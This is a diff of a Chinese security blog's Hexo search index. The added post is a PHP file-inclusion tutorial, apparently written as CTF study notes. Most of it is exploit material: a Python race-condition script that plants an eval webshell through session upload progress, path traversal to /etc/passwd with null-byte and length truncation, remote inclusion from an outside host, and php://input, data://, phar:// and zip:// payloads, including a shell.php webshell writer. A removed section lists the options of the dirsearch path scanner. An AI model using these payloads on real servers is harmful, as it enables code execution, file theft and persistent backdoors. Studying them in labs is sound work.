+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">enabled=on表示upload<span class="built_in">_</span>progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">prefix+name将表示为session中的键名</span><br><span class="line">session.use<span class="built_in">_</span>strict<span class="built_in">_</span>mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。</span><br></pre></td></tr></table></figure>
+
+<p>可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
+<ul>
+<li>前提：session 的存储位置可以获取</li>
+</ul>
+<p>通过phpinfo函数，读取session的存储位置，一般路径为：在session.save_path中有显示</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png" class title="This is an image">
+
+<ul>
+<li>条件竞争</li>
+</ul>
+<p>举个例子</p>
+<p>将包含漏洞的代码写入文件 session.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个代码功能，通过 GET 将变量值读入到 session 中。</p>
+<p>首先需要通过传入变量，查看 Cookies 中的 PHPSESSID 的值，其内容就是文件名。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/session.php?ctfs=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Exp：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../var/lib/php/session文件名</span><br></pre></td></tr></table></figure>
+
+<p>通过上面写入的恶意代码，你访问文件名就可以执行了。</p>
+<p><strong>问题一</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果没有session_start(),如何创建session文件</span><br></pre></td></tr></table></figure>
+
+<p>解答：</p>
+<p>当session.auto_start&#x3D;on时，PHP在接受到请求后初始化Session，不用执行session_start（）。但是默认情况下，这个选项是不开启的。</p>
+<p>但是session中存在一个默认选项，<code>session.use_strict_mode=0</code>。表示用户可以自定义session的ID，例如，设置Cookie里的PHPSESSION&#x3D;FLAG，php就会在服务上创建一个文件：&#x2F;tmp&#x2F;sess_FLAG。虽然我们自己没有初始化，但是PHP也会自动初始化。并产生一个键值这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
+<p>漏洞利用脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">​</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><p><strong>%00截断</strong></p>
+<p>前提：<code>php.ini</code>中<code>magic_quotes_qpc=off</code>并且<code>PHP</code>版本&lt; 5.3.4的情况。</p>
+<p>漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它会在你访问的文件中加上 html ，但是你可以通过截断来绕过它。</p>
+<p>Exp：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
+
+<p><strong>长度绕过</strong></p>
+<p>前提：在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line"></span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Exp:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure>
+
+<p><strong>点号截断</strong></p>
+<p>Exp:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
+
+<p><strong>特殊符号</strong></p>
+<p>利用特色符号进行绕过，例如 ?、#、*、%20（空格）等</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt?</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>服务器的PHP配置文件中allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件。如果没有对远程文件进行严格的过滤，从而执行恶意代码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = On（是否允许打开远程文件）</span><br><span class="line"></span><br><span class="line">allow_url_include = On（是否允许<span class="keyword">include</span>/<span class="keyword">require</span>远程文件）</span><br></pre></td></tr></table></figure>
+
+<p>漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Exp：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=http://192.168.91.133/FI/test.php%20</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP伪协议文件包含"><a href="#PHP伪协议文件包含" class="headerlink" title="PHP伪协议文件包含"></a>PHP伪协议文件包含</h2><p>PHP是门强大的语言，所以PHP里面有许多已经封装好的协议，类似于库函数，是可以直接调用的，由于没有进行严格过滤，入侵者就可以利用这些协议完成恶意操作。可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
+<h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>这是一个访问本地文件的协议。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</span><br><span class="line"></span><br><span class="line">php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
+<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
+</tr>
+<tr>
+<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
+<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<p>漏洞代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Exp：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">URL/?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">php://input 是个可以访问请求的原始数据的只读流。 enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。</span><br></pre></td></tr></table></figure>
+
+<p>用法：?file&#x3D;php:&#x2F;&#x2F;input 数据利用POST传过去。</p>
+<ul>
+<li><strong>读取POST数据</strong></li>
+</ul>
+<p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>写入木马</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
+<p>就是你POST过去的PHP代码会被执行</p>
+<p>恶意代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它会生成一个shell.php的一句话木马文件</p>
+<ul>
+<li><strong>命令执行</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
+<p>恶意代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>读取本地文件中的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Exp:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?file=file:///var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>data:数据流封装器。一般遇到 <strong>file_get_contents()</strong> 可以来用</p>
+<p>用法：<code>data://text/plain;base64,</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印 &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：<code>&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;</code>闭合;</p>
+<p>如果php.ini里的allow_url_include&#x3D;On（PHP &lt; 5.3.0）,就可以造成任意代码执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>恶意代码</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>这是 php 中用来解压打包文件的，不管后缀是什么。</p>
+<p>用法：?file&#x3D;phar: &#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php </p>
+<p>注意： PHP &gt; &#x3D;5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p>
+<p>步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=phar://shell.png/shell.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>zip 伪协议和 phar 协议类似，但是用法不一样。</p>
+<p>用法：?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] zip:&#x2F;&#x2F;xxx.png#shell.php。</p>
+<p>前提： <strong>PHP &gt; &#x3D;5.3.0</strong></p>
+<p>注意：在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 <strong>#</strong> 在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=zip://shell.png%23shell.php</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF Show(文件包含)</title>
     <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本场题目来自于CTF show，本文只是记录学习过程，以及能够提供一点小帮助再好不过</p>
@@ -921,465 +1380,6 @@
       <tags>
         <tag>Hexo</tag>
         <tag>建站</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dirsearch-路径扫描</title>
-    <url>/2022/dirsearch/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一款高级命令行工具，旨在暴力破解网络服务器中的目录和文件，AKA 网络路径扫描器。</p>
-<p>dirsearch进行高精度，可以扩展的扫描，可以根据自己的需求定义，相对于御剑，我个人认为更好点。</p>
-<p><a href="https://github.com/maurosoria/dirsearch">dirsearch工具地址</a></p>
-<span id="more"></span>    
-
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
-<li>使用 git 安装：<code>git clone https://github.com/maurosoria/dirsearch.git</code></li>
-<li>使用 ZIP 文件安装：<a href="https://github.com/maurosoria/dirsearch/archive/master.zip">在此处下载</a></li>
-<li>使用 Docker 安装：（<code>docker build -t &quot;dirsearch:v0.4.1&quot;</code>更多<a href="https://github.com/maurosoria/dirsearch#support-docker">信息</a>）</li>
-<li>使用 Kali Linux 安装：<code>sudo apt-get install dirsearch</code></li>
-<li>使用 PyPi 安装：<code>pip3 install dirsearch</code></li>
-</ul>
-<p>安装库</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/maurosoria/dirsearch.git</span><br><span class="line">cd dirsearch</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSIONS&gt;</span><br></pre></td></tr></table></figure>
-
-<p>requirements.txt 中包含了 dirsearch 中需要的库。</p>
-<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             显示程序的版本号并退出</span><br><span class="line">  -h, --<span class="built_in">help</span>            显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">  Mandatory: <span class="comment">#强制性的</span></span><br><span class="line">    -u URL, --url=URL   目标网址</span><br><span class="line">    -l FILE, --url-list=FILE</span><br><span class="line">                        目标URL列表文件</span><br><span class="line">    --stdin             来自STDIN的目标URL列表</span><br><span class="line">    --cidr=CIDR         目标CIDR</span><br><span class="line">    --raw=FILE          从文件加载原始HTTP请求 (use `--scheme` flag to <span class="built_in">set</span> the scheme)</span><br><span class="line">    -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        用逗号分隔的扩展列表 (Example: php,asp)</span><br><span class="line">    -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span><br><span class="line">                        排除由逗号分隔的扩展列表 (Example: asp,jsp)</span><br><span class="line">    -f, --force-extensions</span><br><span class="line">                        为每个单词列表条目添加扩展名。默认情况下dirsearch仅将%EXT%关键字替换为扩展</span><br><span class="line"></span><br><span class="line">  Dictionary Settings: <span class="comment">#字典设置</span></span><br><span class="line">    -w WORDLIST, --wordlists=WORDLIST</span><br><span class="line">                        自定义词表 (用逗号分隔)</span><br><span class="line">    --prefixes=PREFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义前缀 (用逗号分隔)</span><br><span class="line">    --suffixes=SUFFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义后缀，忽略目录(用逗号分隔)</span><br><span class="line">    --only-selected     删除路径与选定路径具有不同的扩展名通过`-e的` (保留条目没有扩展名)</span><br><span class="line">    --remove-extensions</span><br><span class="line">                        删除所有路径中的扩展 (Example: admin.php -&gt; admin)</span><br><span class="line">    -U, --uppercase     Uppercase wordlist</span><br><span class="line">    -L, --lowercase     Lowercase wordlist</span><br><span class="line">    -C, --capital       Capital wordlist</span><br><span class="line"></span><br><span class="line">  General Settings: <span class="comment">#一般设置</span></span><br><span class="line">    -t THREADS, --threads=THREADS  线程数</span><br><span class="line">    -r, --recursive     暴力循环</span><br><span class="line">    --deep-recursive    对每个目录深度执行递归扫描</span><br><span class="line">                        (Example: api/users -&gt; api/)</span><br><span class="line">    --force-recursive   对每个找到的路径进行递归暴力，而不是只有路径以斜线结尾</span><br><span class="line">    --recursion-depth=DEPTH 最大递归深度</span><br><span class="line">    --recursion-status=CODES</span><br><span class="line">                        执行递归扫描的有效状态代码，支持范围 (用逗号分隔)</span><br><span class="line">    --subdirs=SUBDIRS   扫描给定URL的子目录 (用逗号分隔)</span><br><span class="line">    --exclude-subdirs=SUBDIRS</span><br><span class="line">                        在递归过程中排除以下子目录扫描 (用逗号分隔)</span><br><span class="line">    -i CODES, --include-status=CODES</span><br><span class="line">                        包括状态代码，用逗号分隔，支持范围 (Example: 200,300-399)</span><br><span class="line">    -x CODES, --exclude-status=CODES</span><br><span class="line">                        排除状态代码，用逗号分隔，支持范围 (Example: 301,500-599)</span><br><span class="line">    --exclude-sizes=SIZES</span><br><span class="line">                        按大小排除响应，以逗号分隔 (Example: 123B,4KB)</span><br><span class="line">    --exclude-texts=TEXTS</span><br><span class="line">                        按文本排除回复，用逗号分隔 (Example: <span class="string">&#x27;Not found&#x27;</span>, <span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">    --exclude-regexps=REGEXPS</span><br><span class="line">                        通过regexp排除响应，用逗号分隔</span><br><span class="line">                        (Example: <span class="string">&#x27;Not foun[a-z]&#123;1&#125;&#x27;</span>, <span class="string">&#x27;^Error$&#x27;</span>)</span><br><span class="line">    --exclude-redirects=REGEXPS</span><br><span class="line">                        通过重定向正则表达式或文本排除响应,</span><br><span class="line">                        用逗号分隔 (Example: <span class="string">&#x27;https://okta.com/*&#x27;</span>)</span><br><span class="line">    --exclude-content=PATH</span><br><span class="line">                        按此路径的响应内容排除响应</span><br><span class="line">    --skip-on-status=CODES</span><br><span class="line">                        无论何时命中其中一个状态码，跳过目标，用逗号分隔，支持范围</span><br><span class="line">    --minimal=LENGTH    最小响应长度</span><br><span class="line">    --maximal=LENGTH    最大响应长度</span><br><span class="line">    --max-time=SECONDS  扫描的最大运行时间</span><br><span class="line">    -q, --quiet-mode    安静模式</span><br><span class="line">    --full-url          输出中的完整URL (在中自动启用安静模式)</span><br><span class="line">    --no-color          没有彩色输出</span><br><span class="line"></span><br><span class="line">  Request Settings: <span class="comment">#请求设置</span></span><br><span class="line">    -m METHOD, --http-method=METHOD HTTP方法 (default: GET)</span><br><span class="line">    -d DATA, --data=DATA HTTP请求数据</span><br><span class="line">    -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP请求头，支持多个标志 (Example:</span><br><span class="line">                        -H <span class="string">&#x27;Referer: example.com&#x27;</span>)</span><br><span class="line">    --header-list=FILE  文件包含HTTP请求头</span><br><span class="line">    -F, --follow-redirects</span><br><span class="line">                        遵循HTTP重定向</span><br><span class="line">    --random-agent      为每个请求选择一个随机用户代理</span><br><span class="line">    --auth-type=TYPE    身份验证类型 (basic, digest, bearer, ntlm)</span><br><span class="line">    --auth=CREDENTIAL   认证凭证 (user:password or bearer token)</span><br><span class="line">    --user-agent=USERAGENT</span><br><span class="line">    --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">  Connection Settings: <span class="comment">#连接设置</span></span><br><span class="line">    --<span class="built_in">timeout</span>=TIMEOUT   连接超时</span><br><span class="line">    -s DELAY, --delay=DELAY</span><br><span class="line">                        请求之间的延迟</span><br><span class="line">    --proxy=PROXY       代理URL，支持HTTP和SOCKS代理 (Example:</span><br><span class="line">                        localhost:8080, socks5://localhost:8088)</span><br><span class="line">    --proxy-list=FILE   文件包含代理服务器</span><br><span class="line">    --replay-proxy=PROXY</span><br><span class="line">                        要使用找到的路径重播的代理</span><br><span class="line">    --scheme=SCHEME     默认方案 (对于原始请求或如果没有URL中的方案)</span><br><span class="line">    --max-rate=RATE     每秒最大请求数</span><br><span class="line">    --retries=RETRIES   失败请求的重试次数</span><br><span class="line">    -b, --request-by-hostname</span><br><span class="line">                        